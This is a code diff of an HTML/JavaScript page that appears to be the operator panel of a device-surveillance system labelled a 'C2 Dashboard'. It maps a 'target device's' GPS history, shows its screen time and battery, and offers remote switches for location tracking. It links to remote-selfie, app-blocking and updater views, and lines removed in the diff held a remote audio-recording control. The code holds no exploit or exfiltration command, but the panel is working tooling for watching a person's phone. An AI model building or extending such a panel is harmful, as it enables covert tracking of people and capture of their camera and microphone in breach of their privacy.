@@ -5,801 +5,859 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Anasio | Location History</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
     <style>
-        #map { height: 300px; border-radius: 1rem; z-index: 10; }
-        .scroller::-webkit-scrollbar { width: 6px; }
-        .scroller::-webkit-scrollbar-track { background: #f1f5f9; }
-        .scroller::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+        #map { height: 560px; border-radius: .75rem; z-index: 10; }
+        .scroller::-webkit-scrollbar { width: 5px; }
+        .scroller::-webkit-scrollbar-track { background: transparent; }
+        .scroller::-webkit-scrollbar-thumb { background: #d1d5db; border-radius: 4px; }
+        .spinning { animation: spin .8s linear infinite; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #filter-status { transition: opacity .3s; }
     </style>
 </head>
 <body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
-    <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
-        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200 gap-4">
-            <div class="flex items-center gap-4">
-                <div class="bg-blue-600 text-white p-2 rounded-lg">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path></svg>
-                </div>
-                <div><h1 class="text-xl font-bold tracking-tight text-gray-900 text-center md:text-left">Historical Tracking Logs</h1></div>
-            </div>
-            <div class="flex flex-wrap justify-center items-center gap-4">
-                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
-                <a href="/apps_view" class="text-xs font-bold text-purple-600 hover:text-purple-800 transition tracking-wide uppercase">App Blocker</a>
-                <a href="/selfies_view" class="text-xs font-bold text-emerald-600 hover:text-emerald-800 transition tracking-wide uppercase">📸 Selfies</a>
-                <a href="/errors_view" class="text-xs font-bold text-red-500 hover:text-red-700 transition tracking-wide uppercase">Diagnostics</a>
-                <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
-                    <option value="">Loading...</option>
-                </select>
-            </div>
-        </nav>
+<div id="toast-container" class="fixed top-4 right-4 z-[9999] flex flex-col gap-2 pointer-events-none"></div>
+<div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
 
-        <div class="mb-6 bg-white p-4 rounded-2xl shadow-sm border border-gray-200 flex flex-wrap gap-4 items-center justify-between">
-            <div class="flex items-center gap-4 flex-wrap">
-                <input type="date" id="history-date" class="border border-gray-200 rounded-xl px-3 py-1.5 text-sm bg-gray-50 cursor-pointer">
-                
-                <div class="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-1.5 bg-gray-50">
-                    <span class="text-xs font-bold text-gray-400 uppercase tracking-widest hidden sm:inline">Time:</span>
-                    <input type="range" id="start-hour" min="0" max="24" value="0" class="w-16 sm:w-24 cursor-pointer accent-blue-600">
-                    <span id="time-range-display" class="text-xs font-bold text-gray-700 w-24 text-center">00:00 - 24:00</span>
-                    <input type="range" id="end-hour" min="0" max="24" value="24" class="w-16 sm:w-24 cursor-pointer accent-blue-600">
-                </div>
+    <!-- Nav -->
+    <nav class="mb-6 flex flex-wrap justify-between items-center bg-white px-5 py-4 rounded-2xl border border-gray-200 gap-4">
+        <div class="flex items-center gap-3">
+            <div class="bg-cyan-50 text-cyan-600 p-2.5 rounded-xl">
+                <i class="ti ti-map-pin text-xl"></i>
             </div>
-            <div class="flex justify-end">
-                <button type="button" onclick="resetAndFetchHistory()" class="bg-gray-900 text-white text-xs font-bold px-4 py-2.5 rounded-xl uppercase tracking-wider hover:bg-black transition">Apply Filter</button>
+            <div>
+                <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest">Device Intelligence</p>
+                <h1 class="text-xl font-semibold text-gray-900 leading-tight">Location History</h1>
             </div>
         </div>
+        <div class="flex flex-wrap items-center gap-1.5">
+            <a href="/" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-cpu text-sm"></i> C2</a>
+            <a href="/apps_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-lock text-sm"></i> Apps</a>
+            <a href="/selfies_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-camera text-sm"></i> Selfies</a>
+            <a href="/errors_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-alert-circle text-sm"></i> Diag</a>
+            <a href="/updater_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-refresh-alert text-sm"></i> Update</a>
+            <div class="w-px h-5 bg-gray-200 mx-1"></div>
+            <select id="device-select" aria-label="Select device" class="bg-white text-gray-800 font-medium text-sm border border-gray-200 rounded-lg px-3 py-1.5 focus:outline-none focus:ring-2 focus:ring-cyan-400 cursor-pointer hover:border-cyan-300 transition appearance-none pr-7">
+                <option value="">No device</option>
+            </select>
+        </div>
+    </nav>
 
-        <div class="flex flex-col gap-6">
-            <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 w-full relative overflow-hidden flex flex-col">
-                <div id="map" class="w-full z-0 rounded-xl overflow-hidden" style="height: 600px;"></div>
+    <!-- Filters -->
+    <div class="bg-white rounded-2xl border border-gray-200 p-5 mb-4">
+        <div class="flex items-center gap-2 mb-4">
+            <p class="text-xs font-semibold text-gray-400 uppercase tracking-widest flex items-center gap-1.5"><i class="ti ti-adjustments-horizontal"></i> Advanced filters</p>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div>
+                <label class="block text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-1.5" for="history-date">Select date</label>
+                <input type="date" id="history-date" class="w-full border border-gray-200 rounded-lg px-3 py-2 text-sm bg-gray-50 text-gray-900 focus:outline-none focus:ring-2 focus:ring-cyan-400 transition cursor-pointer hover:border-cyan-300">
             </div>
-
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Screen Time</p>
-                    <p class="text-3xl font-black text-gray-900" id="daily-screen-time-text">0h 0m</p>
-                    <p class="text-xs text-gray-500 mt-2">Selected date total for the target device</p>
+            <div>
+                <label class="block text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-1.5">Time window</label>
+                <div class="flex items-center gap-3 bg-gray-50 border border-gray-200 rounded-lg px-3 py-2 hover:border-cyan-300 transition">
+                    <i class="ti ti-clock text-gray-400 text-sm flex-shrink-0"></i>
+                    <input type="range" id="start-hour" min="0" max="24" value="0" step="1" class="flex-1 accent-cyan-500 cursor-pointer">
+                    <span id="time-range-display" class="text-xs font-semibold text-cyan-600 w-28 text-center whitespace-nowrap">00:00 – 24:00</span>
+                    <input type="range" id="end-hour" min="0" max="24" value="24" step="1" class="flex-1 accent-cyan-500 cursor-pointer">
                 </div>
-                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
-                    <div class="flex items-center justify-between mb-4">
-                        <div>
-                            <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Device Summary</p>
-                            <p id="history-device-status" class="text-sm text-gray-600">Waiting for device...</p>
-                        </div>
-                        <button id="export-history-btn" class="text-xs font-semibold px-3 py-1 rounded-full bg-gray-100 text-gray-700 hover:bg-gray-200 transition">Export CSV</button>
-                    </div>
-                    <div class="grid gap-3 text-sm text-gray-700">
-                        <div class="flex justify-between"><span>Path points</span><span id="history-points-count" class="font-semibold text-gray-800">0</span></div>
-                        <div class="flex justify-between"><span>Total path</span><span id="history-path-distance" class="font-semibold text-gray-800">0 m</span></div>
-                        <div class="flex justify-between"><span>Filter range</span><span id="history-date-range" class="font-semibold text-gray-800">--</span></div>
-                        <div id="history-selection-summary" class="rounded-2xl bg-blue-50 border border-blue-100 p-3 text-sm text-gray-700 mt-4">
-                            <p class="font-semibold text-gray-800 mb-2">Selected point summary</p>
-                            <p class="text-xs text-gray-500">Ctrl/cmd-click two rows to compare points.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
-                    <div class="flex items-center justify-between mb-4">
-                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Location & GPS Tracking</p>
-                    </div>
-                    <div class="flex flex-col gap-3">
-                        <div class="flex flex-col gap-2">
-                            <div class="flex flex-wrap items-center gap-4">
-                                <div class="flex items-center gap-2">
-                                    <span class="text-sm font-semibold text-gray-700">Tracking (device state):</span>
-                                    <span id="loc-state-text" class="text-xs font-bold bg-gray-100 text-gray-600 px-2 py-1 rounded">?</span>
-                                </div>
-                                <div class="flex items-center gap-2">
-                                    <span class="text-sm font-semibold text-gray-700">Tracking (server state):</span>
-                                    <span id="loc-server-text" class="text-xs font-bold bg-gray-100 text-gray-600 px-2 py-1 rounded">?</span>
-                                </div>
-                            </div>
-                            <p id="loc-state-note" class="text-xs text-gray-500">Device state is verified on refresh; server state is the desired tracking configuration.</p>
-                        </div>
-                        <div class="flex gap-2">
-                            <button type="button" id="enable-location-btn" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Enable</button>
-                            <button type="button" id="disable-location-btn" class="flex-1 bg-gray-400 hover:bg-gray-500 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Disable</button>
-                        </div>
-                        <button type="button" id="refresh-location-btn" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Refresh Device Status</button>
-                    </div>
-                </div>
-                <div class="lg:col-span-3 bg-white rounded-3xl p-6 shadow-sm border border-gray-200 flex flex-col h-[400px]">
-                    <div class="overflow-y-auto scroller pr-2 flex-1">
-                        <table class="w-full text-left">
-                            <thead><tr class="text-xs text-gray-400 border-b"><th class="pb-2">Time</th><th class="pb-2">Lat</th><th class="pb-2">Lon</th><th class="pb-2">Speed</th><th class="pb-2">Bat</th><th class="pb-2">Gap</th></tr></thead>
-                            <tbody id="history-table" class="text-sm text-gray-600"></tbody>
-                        </table>
-                    </div>
-                    <div id="pagination" class="flex items-center justify-between pt-3 border-t mt-2">
-                        <button onclick="changePage(-1)" id="prev-btn" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition disabled:opacity-30" disabled>← Prev</button>
-                        <span id="page-info" class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Page 1</span>
-                        <button onclick="changePage(1)" id="next-btn" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition disabled:opacity-30" disabled>Next →</button>
-                    </div>
-                </div>
-                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Battery History</p>
-                    <div class="overflow-y-auto scroller pr-2 max-h-64">
-                        <table class="w-full text-left">
-                            <thead><tr class="text-xs text-gray-400 border-b"><th class="pb-2">Time</th><th class="pb-2">Level</th><th class="pb-2">Gap</th></tr></thead>
-                            <tbody id="battery-history-table" class="text-sm text-gray-600"></tbody>
-                        </table>
-                    </div>
-                </div>
-                    <div class="flex flex-col gap-2 mb-4">
-                        <label class="text-xs font-bold text-gray-400 uppercase tracking-widest">Duration (Seconds)</label>
-                        <div class="flex gap-2">
-                            <input type="number" id="audio-duration" value="19" min="1" max="60" class="flex-1 border border-gray-200 rounded-xl px-3 py-2 text-sm bg-gray-50 text-gray-900 focus:outline-none focus:ring-2 focus:ring-red-500">
-                            <button onclick="requestAudio()" id="audio-btn" class="flex-[2] bg-red-600 text-white font-bold py-2 px-4 rounded-xl hover:bg-red-500 transition shadow">Record</button>
-                        </div>
-                    </div>
-                    <div id="audio-list" class="flex flex-col gap-3 max-h-48 overflow-y-auto scroller pr-2"></div>
             </div>
+        </div>
+        <div class="flex items-center gap-3">
+            <button type="button" id="apply-filter-btn" class="flex items-center gap-2 text-xs font-medium bg-cyan-600 hover:bg-cyan-700 text-white px-5 py-2 rounded-lg transition">
+                <i class="ti ti-filter text-sm"></i> Apply filter
+            </button>
+            <button type="button" id="reset-filter-btn" class="flex items-center gap-2 text-xs font-medium border border-gray-200 bg-white hover:bg-gray-50 text-gray-600 px-5 py-2 rounded-lg transition">
+                <i class="ti ti-refresh text-sm"></i> Reset
+            </button>
+            <span id="filter-status" class="text-xs font-medium text-emerald-600 opacity-0 ml-2"></span>
         </div>
     </div>
 
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
-    <script>
-        const selectEl = document.getElementById('device-select');
-        const tableBody = document.getElementById('history-table');
-        const batteryTableBody = document.getElementById('battery-history-table');
-        const historyStatusText = document.getElementById('history-device-status');
-        const locText = document.getElementById('loc-state-text');
-        const locServerText = document.getElementById('loc-server-text');
-        const locNote = document.getElementById('loc-state-note');
-        const historyPointsCount = document.getElementById('history-points-count');
-        const historyPathDistance = document.getElementById('history-path-distance');
-        const historyDateRange = document.getElementById('history-date-range');
-        const exportHistoryBtn = document.getElementById('export-history-btn');
-        const map = L.map('map', {zoomControl: false}).setView([0, 0], 2);
-        L.control.zoom({ position: 'bottomright' }).addTo(map);
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png').addTo(map);
+    <!-- Map -->
+    <div class="bg-white rounded-2xl border border-gray-200 p-2 mb-4">
+        <div id="map" class="w-full"></div>
+    </div>
 
-        let pathLine = L.polyline([], {color: '#ef4444', weight: 4}).addTo(map);
-        let selectedPathLine = L.polyline([], {color: '#2563eb', weight: 6, opacity: 0.75, dashArray: '10, 8'}).addTo(map);
-        let markersGroup = L.layerGroup().addTo(map);
-        let historyMarkers = [];
-        let currentDataHash = "", cachedAudioFilesStr = "", isFirstLoad = true;
-        let currentPage = 1, totalPages = 1;
-        let currentHistoryRows = [];
-        let selectedHistoryPoints = [];
+    <!-- Stats row -->
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
 
-        function getTimeSeconds(row) {
-            if (!row) return null;
-            if (typeof row.unix_time === 'number' && !isNaN(row.unix_time)) return row.unix_time;
-            if (typeof row.unix_time === 'string' && row.unix_time.trim().length > 0) {
-                const parsed = Number(row.unix_time);
-                if (!Number.isNaN(parsed)) return parsed;
-            }
-            if (typeof row.time === 'string' && row.time.trim().length > 0) {
-                const ms = Date.parse(row.time);
-                if (Number.isFinite(ms)) return Math.floor(ms / 1000);
-                const alt = new Date(row.time).getTime();
-                if (!Number.isNaN(alt)) return Math.floor(alt / 1000);
-            }
-            if (typeof row.timestamp === 'string' && row.timestamp.trim().length > 0) {
-                const ms = Date.parse(row.timestamp);
-                if (Number.isFinite(ms)) return Math.floor(ms / 1000);
-                const alt = new Date(row.timestamp).getTime();
-                if (!Number.isNaN(alt)) return Math.floor(alt / 1000);
-            }
-            return null;
-        }
+        <!-- Screen time + summary -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-5">
+            <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-1 flex items-center gap-1.5"><i class="ti ti-device-mobile"></i> Screen time</p>
+            <p class="text-2xl font-semibold text-gray-800 mb-1" id="daily-screen-time-text">0h 0m</p>
+            <p class="text-xs text-gray-400">Selected date total for the target device</p>
+        </div>
 
-        function getPointKey(row) {
-            const timeSec = getTimeSeconds(row);
-            if (!row || timeSec == null) return null;
-            return `${timeSec}_${row.lat.toFixed(6)}_${row.lon.toFixed(6)}`;
-        }
-
-        function getPointIndexByKey(key) {
-            return currentHistoryRows.findIndex(row => getPointKey(row) === key);
-        }
-
-        function getSelectedIndexes() {
-            return selectedHistoryPoints
-                .map(key => getPointIndexByKey(key))
-                .filter(idx => idx >= 0)
-                .sort((a, b) => a - b);
-        }
-
-        async function fetchAvailableDevices() {
-            try {
-                const res = await fetch('/devices');
-                if (!res.ok) return;
-                const data = await res.json();
-                const devices = data.devices || [];
-                const previous = selectEl.value;
-                selectEl.innerHTML = '';
-                if (devices.length === 0) {
-                    selectEl.innerHTML = '<option value="">No devices</option>';
-                    return;
-                }
-                devices.forEach(did => {
-                    const opt = document.createElement('option');
-                    opt.value = did; opt.textContent = did;
-                    selectEl.appendChild(opt);
-                });
-                selectEl.value = devices.includes(previous) ? previous : devices[0];
-            } catch(err) { console.error(err); }
-        }
-
-        const dateInput = document.getElementById('history-date');
-        const startHour = document.getElementById('start-hour');
-        const endHour = document.getElementById('end-hour');
-        const timeDisplay = document.getElementById('time-range-display');
-        const today = new Date();
-        dateInput.value = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`;
-        dateInput.addEventListener('change', setHistoryRangeLabel);
-
-        function updateTimeDisplay() {
-            let s = parseInt(startHour.value);
-            let e = parseInt(endHour.value);
-            if (s > e) { let tmp = s; s = e; e = tmp; }
-            timeDisplay.textContent = `${String(s).padStart(2, '0')}:00 - ${String(e).padStart(2, '0')}:00`;
-            setHistoryRangeLabel();
-        }
-        startHour.addEventListener('input', updateTimeDisplay);
-        endHour.addEventListener('input', updateTimeDisplay);
-
-        function setHistoryRangeLabel() {
-            const date = dateInput.value || new Date().toISOString().slice(0, 10);
-            historyDateRange.textContent = `${date} ${timeDisplay.textContent}`;
-        }
-
-        async function setLocationTracking(enable) {
-            const activeDevice = selectEl.value;
-            if (!activeDevice) return;
-            const fd = new FormData();
-            fd.append('device_id', activeDevice);
-            fd.append('enable', enable);
-            try {
-                const res = await fetch('/set_location_tracking', { method: 'POST', body: fd });
-                if (res.ok) {
-                    refreshLocationState();
-                } else {
-                    alert('Failed to update location tracking state.');
-                }
-            } catch (e) {
-                console.error(e);
-                alert('Could not reach server to change location tracking.');
-            }
-        }
-
-        async function refreshLocationState() {
-            const activeDevice = selectEl.value;
-            if (!activeDevice) return;
-            locText.textContent = '...';
-            locNote.textContent = 'Checking device connectivity...';
-            const fd = new FormData();
-            fd.append('device_id', activeDevice);
-
-            try {
-                const checkRes = await fetch('/check_location_state', { method: 'POST', body: fd });
-                if (!checkRes.ok) {
-                    locText.textContent = 'ERR';
-                    locNote.textContent = 'Device verification failed.';
-                    return;
-                }
-                const checkData = await checkRes.json();
-
-                const statsRes = await fetch(`/stats?device_id=${encodeURIComponent(activeDevice)}`);
-                if (!statsRes.ok) {
-                    locText.textContent = 'ERR';
-                    locNote.textContent = checkData.connected ? 'Device reachable but status fetch failed.' : 'Device unreachable; cannot verify state.';
-                    return;
-                }
-                const statsData = await statsRes.json();
-                const serverState = statsData.location_tracking === 1 ? 'ON' : 'OFF';
-                locServerText.textContent = serverState;
-
-                if (checkData.loc_state !== null) {
-                    locText.textContent = checkData.loc_state === 1 ? 'ON' : 'OFF';
-                    locNote.textContent = checkData.connected ? 'Device reachable; verified tracking state from device.' : 'Last known device state used.';
-                } else {
-                    locText.textContent = serverState;
-                    if (checkData.connected) {
-                        locNote.textContent = 'Device reachable but state verification timed out; showing server state.';
-                    } else {
-                        locNote.textContent = 'Device unreachable; showing server state.';
-                    }
-                }
-            } catch (e) {
-                console.error(e);
-                locText.textContent = 'ERR';
-                locNote.textContent = 'Could not refresh location state.';
-            }
-        }
-
-        function calculateDistanceMeters(points) {
-            if (!points || points.length < 2) return 0;
-            const toRad = x => x * Math.PI / 180;
-            let total = 0;
-            for (let i = 1; i < points.length; i++) {
-                const [lat1, lon1] = points[i - 1];
-                const [lat2, lon2] = points[i];
-                const dLat = toRad(lat2 - lat1);
-                const dLon = toRad(lon2 - lon1);
-                const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
-                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-                total += 6371000 * c;
-            }
-            return total;
-        }
-
-        function formatDistance(meters) {
-            if (meters >= 1000) return `${(meters / 1000).toFixed(2)} km`;
-            return `${Math.round(meters)} m`;
-        }
-
-        function formatSpeed(speedMs) {
-            if (!speedMs || speedMs <= 0) return '0.0 km/h';
-            return `${(speedMs * 3.6).toFixed(1)} km/h`;
-        }
-
-        function getPointSpeed(index, rows) {
-            if (!rows || rows.length === 0 || index < 0 || index >= rows.length) return '0.0 km/h';
-            const row = rows[index];
-            // Use backend-calculated speed if available
-            if (row.speed !== undefined && row.speed !== null) {
-                return `${row.speed} km/h`;
-            }
-            // Fallback to client-side calculation
-            const prev = rows[index - 1];
-            if (!prev) return '0.0 km/h';
-            const currentTime = getTimeSeconds(row);
-            const prevTime = getTimeSeconds(prev);
-            if (currentTime == null || prevTime == null) return '0.0 km/h';
-            const timeDiff = Math.abs(currentTime - prevTime);
-            if (timeDiff <= 0) return '0.0 km/h';
-            const dist = calculateDistanceMeters([[prev.lat, prev.lon], [row.lat, row.lon]]);
-            return formatSpeed(dist / timeDiff);
-        }
-
-        function createHistoryMarker(row, index) {
-            const key = getPointKey(row);
-            const icon = L.divIcon({
-                className: 'history-marker',
-                html: `<div class="${selectedHistoryPoints.includes(key) ? 'bg-blue-700' : 'bg-red-500'} rounded-full w-3 h-3 border border-white"></div>`,
-                iconSize:[12,12],
-            });
-            const marker = L.marker([row.lat, row.lon], { icon })
-                .bindPopup(`Time: ${new Date(row.unix_time * 1000).toLocaleString()}<br>Speed: ${getPointSpeed(index, currentHistoryRows)}<br>Bat: ${row.level}%`)
-                .on('click', (event) => handleMapPointClick(event, key));
-            marker.rowKey = key;
-            return marker;
-        }
-
-        function updateMarkerStyles() {
-            historyMarkers.forEach((marker) => {
-                const iconEl = document.createElement('div');
-                iconEl.className = selectedHistoryPoints.includes(marker.rowKey) ? 'bg-blue-700 rounded-full w-3 h-3 border border-white' : 'bg-red-500 rounded-full w-3 h-3 border border-white';
-                marker.setIcon(L.divIcon({ className: 'history-marker', html: iconEl.outerHTML, iconSize:[12,12] }));
-            });
-        }
-
-        function handleMapPointClick(event, key) {
-            if (event.originalEvent.ctrlKey || event.originalEvent.metaKey) {
-                if (selectedHistoryPoints.includes(key)) {
-                    selectedHistoryPoints = selectedHistoryPoints.filter(i => i !== key);
-                } else {
-                    if (selectedHistoryPoints.length >= 2) {
-                        selectedHistoryPoints = [selectedHistoryPoints[1]];
-                    }
-                    selectedHistoryPoints.push(key);
-                }
-                updateSelectionSummary();
-                renderSelectedRowStyles();
-                updateMarkerStyles();
-                updateSelectionLine();
-                return;
-            }
-            const idx = getPointIndexByKey(key);
-            const row = currentHistoryRows[idx];
-            if (row) map.setView([row.lat, row.lon], 17);
-        }
-
-        function updateSelectionLine() {
-            const selectedIndexes = getSelectedIndexes();
-            if (selectedIndexes.length < 2) {
-                selectedPathLine.setLatLngs([]);
-                return;
-            }
-            const startIndex = selectedIndexes[0];
-            const endIndex = selectedIndexes[selectedIndexes.length - 1];
-            const segment = currentHistoryRows.slice(startIndex, endIndex + 1).map(row => [row.lat, row.lon]);
-            selectedPathLine.setLatLngs(segment);
-            selectedPathLine.bringToFront();
-        }
-
-        function handleHistoryRowClick(event, key) {
-            if (event.ctrlKey || event.metaKey) {
-                if (selectedHistoryPoints.includes(key)) {
-                    selectedHistoryPoints = selectedHistoryPoints.filter(k => k !== key);
-                } else {
-                    if (selectedHistoryPoints.length >= 2) {
-                        selectedHistoryPoints = [selectedHistoryPoints[1]];
-                    }
-                    selectedHistoryPoints.push(key);
-                }
-                updateSelectionSummary();
-                renderSelectedRowStyles();
-                updateMarkerStyles();
-                updateSelectionLine();
-                return;
-            }
-            const idx = getPointIndexByKey(key);
-            const row = currentHistoryRows[idx];
-            if (row) map.setView([row.lat, row.lon], 17);
-        }
-
-        function getSelectedRangeInfo() {
-            if (selectedHistoryPoints.length < 2) return null;
-            const selectedIndexes = selectedHistoryPoints
-                .map(key => getPointIndexByKey(key))
-                .filter(idx => idx >= 0)
-                .sort((a, b) => a - b);
-            if (selectedIndexes.length < 2) return null;
-            const startIndex = selectedIndexes[0];
-            const endIndex = selectedIndexes[selectedIndexes.length - 1];
-            const startRow = currentHistoryRows[startIndex];
-            const endRow = currentHistoryRows[endIndex];
-            const startTimeSec = getTimeSeconds(startRow);
-            const endTimeSec = getTimeSeconds(endRow);
-            if (!startRow || !endRow || startTimeSec == null || endTimeSec == null) return null;
-            const totalTime = Math.abs(endTimeSec - startTimeSec);
-            let totalDistance = 0;
-            for (let i = startIndex; i < endIndex; i++) {
-                const current = currentHistoryRows[i];
-                const next = currentHistoryRows[i + 1];
-                if (current && next) {
-                    totalDistance += calculateDistanceMeters([[current.lat, current.lon], [next.lat, next.lon]]);
-                }
-            }
-            const avgSpeedMs = totalTime > 0 ? totalDistance / totalTime : 0;
-            return {
-                startTime: new Date(startTimeSec * 1000),
-                endTime: new Date(endTimeSec * 1000),
-                totalTime,
-                totalDistance,
-                avgSpeedMs,
-                pointCount: endIndex - startIndex + 1,
-                startIndex,
-                endIndex
-            };
-        }
-
-        function updateSelectionSummary() {
-            const summaryEl = document.getElementById('history-selection-summary');
-            const info = getSelectedRangeInfo();
-            if (!info) {
-                summaryEl.innerHTML = `
-                    <p class="font-semibold text-gray-800 mb-2">Selected point summary</p>
-                    <p class="text-xs text-gray-500">Ctrl/cmd-click two rows to compare points.</p>
-                `;
-                return;
-            }
-            summaryEl.innerHTML = `
-                <p class="font-semibold text-gray-800 mb-2">Selected range summary</p>
-                <div class="grid gap-2 text-xs text-gray-700">
-                    <div class="flex justify-between"><span>Start:</span><span>${info.startTime.toLocaleString()}</span></div>
-                    <div class="flex justify-between"><span>End:</span><span>${info.endTime.toLocaleString()}</span></div>
-                    <div class="flex justify-between"><span>Total time:</span><span>${Math.floor(info.totalTime/3600)}h ${Math.floor((info.totalTime%3600)/60)}m ${info.totalTime%60}s</span></div>
-                    <div class="flex justify-between"><span>Distance:</span><span>${formatDistance(info.totalDistance)}</span></div>
-                    <div class="flex justify-between"><span>Avg speed:</span><span>${formatSpeed(info.avgSpeedMs)}</span></div>
-                    <div class="flex justify-between"><span>Point count:</span><span>${info.pointCount}</span></div>
+        <!-- Device summary -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-5">
+            <div class="flex items-center justify-between mb-3">
+                <div>
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest flex items-center gap-1.5"><i class="ti ti-info-circle"></i> Device summary</p>
+                    <div id="history-device-status" class="mt-1">
+                        <span class="inline-flex items-center gap-1.5 text-xs font-medium bg-gray-100 text-gray-500 px-2.5 py-0.5 rounded-full">
+                            <span class="w-1.5 h-1.5 rounded-full bg-current"></span>Waiting…
+                        </span>
+                    </div>
                 </div>
-            `;
-        }
+                <button id="export-history-btn" class="flex items-center gap-1.5 text-xs font-medium border border-gray-200 bg-white hover:bg-gray-50 text-gray-600 px-3 py-1.5 rounded-lg transition">
+                    <i class="ti ti-file-download text-sm"></i> CSV
+                </button>
+            </div>
+            <div class="flex flex-col gap-1.5 text-xs text-gray-600">
+                <div class="flex justify-between"><span class="text-gray-400">Path points</span><span id="history-points-count" class="font-medium text-gray-700">0</span></div>
+                <div class="flex justify-between"><span class="text-gray-400">Total path</span><span id="history-path-distance" class="font-medium text-gray-700">0 m</span></div>
+                <div class="flex justify-between"><span class="text-gray-400">Filter range</span><span id="history-date-range" class="font-medium text-gray-700">--</span></div>
+            </div>
+            <div id="history-selection-summary" class="mt-3 rounded-xl bg-blue-50 border border-blue-100 p-3 text-xs text-gray-700">
+                <p class="font-semibold text-gray-700 mb-1">Selected point summary</p>
+                <p class="text-gray-400">Ctrl/cmd-click two rows to compare points.</p>
+            </div>
+        </div>
 
-        function renderSelectedRowStyles() {
-            const rows = tableBody.querySelectorAll('tr');
-            rows.forEach((tr, idx) => {
-                const row = currentHistoryRows[idx];
-                const key = getPointKey(row);
-                if (key && selectedHistoryPoints.includes(key)) {
-                    tr.classList.add('bg-blue-100', 'text-blue-900');
-                } else {
-                    tr.classList.remove('bg-blue-100', 'text-blue-900');
+        <!-- GPS tracking -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-5">
+            <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-3 flex items-center gap-1.5"><i class="ti ti-satellite"></i> Location & GPS tracking</p>
+            <div class="flex flex-col gap-2 mb-3">
+                <div class="flex items-center gap-3 flex-wrap">
+                    <div class="flex items-center gap-2">
+                        <span class="text-xs text-gray-500">Device state:</span>
+                        <span id="loc-state-text" class="text-xs font-semibold bg-gray-100 text-gray-600 px-2 py-0.5 rounded-md">?</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="text-xs text-gray-500">Server state:</span>
+                        <span id="loc-server-text" class="text-xs font-semibold bg-gray-100 text-gray-600 px-2 py-0.5 rounded-md">?</span>
+                    </div>
+                </div>
+                <p id="loc-state-note" class="text-[10px] text-gray-400">Device state is verified on refresh; server state is the desired tracking configuration.</p>
+            </div>
